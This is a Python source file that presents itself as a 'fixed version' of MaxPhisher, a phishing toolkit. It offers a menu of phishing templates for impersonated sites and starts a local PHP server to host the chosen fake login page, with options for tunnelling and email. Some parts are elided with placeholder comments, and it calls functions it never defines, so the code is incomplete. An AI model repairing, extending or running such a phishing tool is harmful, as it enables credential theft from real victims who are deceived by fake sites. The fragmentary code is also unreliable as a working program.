# -*- coding: UTF-8 -*-
# Fixed version of MaxPhisher with all major errors corrected

from argparse import ArgumentParser
from importlib import import_module as eximport
from glob import glob
from hashlib import sha256
from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    makedirs,
    mkdir,
    mknod,
    popen,
    remove,
    rename,
    replace,
    system
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy as cp,
    copy2,
    copyfile,
    copytree,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
    SIGKILL,
    SIGTERM
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
from smtplib import SMTP_SSL as smtp
from socket import (
    AF_INET as inet,
    SOCK_STREAM as stream,
    setdefaulttimeout,
    socket
)
from sys import (
    argv,
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    ctime,
    sleep,
    time
)
from zipfile import ZipFile

# Fixed color snippets
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
nc = "\033[00m"

version = "1.1"

# Regular Snippets
ask = f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error = f"{blue}[{white}!{blue}] {red}"
info = f"{yellow}[{white}+{yellow}] {cyan}"
info2 = f"{green}[{white}•{green}] {purple}"

# Fixed logo with raw string
logo = fr"""
{red} __  __            ____  _     _     _
{cyan}|  \/  | __ ___  _|  _ \| |__ (_)___| |__   ___ _ __
{yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
{blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
{red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
{yellow}{" "*31}             [{blue}v{version}{yellow}]
{cyan}{" "*28}        [{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
"""

# ... [rest of the imports and constants]

def main_menu():
    global ptype, mode, troubleshoot
    shell("stty -echoctl") # Skip printing ^C
    if update:
        updater()
    requirements()
    if troubleshoot in ts_commands:
        command = ts_commands[troubleshoot]
        shell(command)
        pexit()
    
    # Fixed JSON parsing with proper error handling
    try:
        with open(templates_file, 'r') as f:
            tempdata = f.read()
        templates = parse(tempdata)
    except Exception as e:
        sprint(f"\n{error}templates.json file is corrupted or missing!")
        exit(1)
        
    names = list(templates.keys())
    choices = [str(i) for i in range(1, len(names)+1)]
    
    while True:
        clear(lol=True)
        show_options(names)
        if ptype is not None:
            choice = ptype
        elif mode == "test":
            choice = default_type
        else:
            choice = input(f"{ask}Select one of the options > {green}")
        
        # Fixed choice handling
        if choice != "0" and choice.startswith("0"):
            choice = choice.replace("0", "")
        if choice in choices:
            index = int(choice) - 1  # Fixed index conversion
            if index < len(names):  # Added bounds checking
                phishing_type = names[index]
                secondary_menu(templates[phishing_type], phishing_type)
            else:
                sprint(f"\n{error}Invalid selection!")
        elif choice.lower() == "a":
            about()
        elif choice.lower() == "s":
            saved()
        elif choice.lower() == "m":
            bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
        elif choice == "0":
            pexit()
        else:
            sprint(f"\n{error}Wrong input {bred}'{choice}'")
            ptype = None

# Fixed server function
def server():
    global mode
    clear()
    
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
        
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    
    # Fixed log file handling
    log_files = [php_file, cf_file, lx_file, lhr_file]
    for logfile in log_files:
        try:
            delete(logfile)
            if not isfile(logfile):
                mknod(logfile)
        except Exception as e:
            sprint(f"\n{error}File permission error: {str(e)}")
            pexit()
    
    # Fixed PHP server startup
    try:
        php_log = open(php_file, "w")
        php_process = bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
        sleep(2)
        
        # Fixed status check
        try:
            status_code = get(f"http://{local_url}", timeout=5).status_code
        except Exception as e:
            status_code = 400
            
        if status_code <= 400:
            sprint(f"\n{info}PHP Server started successfully!")
        else:
            sprint(f"\n{error}PHP Error! Code: {status_code}")
            pexit()
    except Exception as e:
        sprint(f"\n{error}Failed to start PHP server: {str(e)}")
        pexit()
    
    # ... [rest of the server function]

if __name__ == '__main__':
    try:
        # Fixed argument parsing
        args = argparser.parse_args()
        port = args.port
        ptype = args.type
        option = args.option
        region = args.region
        subdomain = args.subdomain
        tunneler = args.tunneler
        fest = args.fest
        ytid = args.ytid
        url = args.url
        directory = args.directory
        duration = args.duration
        mode = args.mode
        troubleshoot = args.troubleshoot
        key = args.nokey if mode != "test" else False
        update = args.noupdate
        
        local_url = f"127.0.0.1:{port}"
        main_menu()
        
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        # Fixed exception handling
        print(f"\n{error}An unexpected error occurred: {str(e)}")
        print(f"{info}Please report this issue at: {repo_url}/issues")
        exit(1)
